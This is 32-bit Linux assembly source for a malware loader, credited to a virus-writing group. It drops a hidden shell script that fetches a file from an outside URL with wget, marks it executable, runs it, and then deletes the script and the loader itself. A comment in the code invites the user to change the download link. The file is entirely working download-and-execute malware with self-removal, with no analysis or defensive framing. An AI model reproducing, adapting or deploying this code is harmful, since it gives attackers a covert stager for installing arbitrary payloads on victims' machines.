; simple loader in 32 bit linux asm
;
; drops a shell script to download and execute the file
; deletes itself
;
; written by R3s1stanc3 [vxnetw0rk]

global _start


section .data

    %defstr home %!HOME
    %defstr home_env HOME=%!HOME

    HOME:           db home,0
    HOME_ENV:       db home_env,0

    script:     db "#!/bin/sh", 10, "export name=.file", 10
            db "wget ", 0
            db "http://www.r3s1stanc3.co.cc/test.sh", 0     ; change the link
            db " -O $name", 10
            db "chmod +x $name", 10
            db "./$name", 10
            db "rm ...", 10
            db "rm $0", 0
    scriptLEN:  equ $-script
    scriptname: db '.loader.sh', 0

    newname:    db '...', 0

    shell:      db "/bin/sh", 0
    argv:       dd shell, scriptname, 0
    endv:       dd HOME_ENV, 0


_start:

    mov eax,    8           ; sys_creat
    mov ebx,    scriptname
    mov ecx,    00755Q                  ; -rwxr-xr-x in octa
    int 80h

    test    eax,    eax
    js  Exit

    mov ebx,    eax
    mov eax,    4           ; sys_write
    mov ecx,    script
    mov edx,    scriptLEN
    int 80h

    mov eax,    11          ; sys_execv
    mov ebx,    shell
    mov ecx,    argv
    mov edx,    endv
    int 80h

    mov eax,    10          ; sys_unlink
    mov ebx,    [esp+4]         ; get filename of the stack
    int 80h             ; delete yourself


Exit:
    mov     eax,    1
    mov ebx,    0
    int 80h
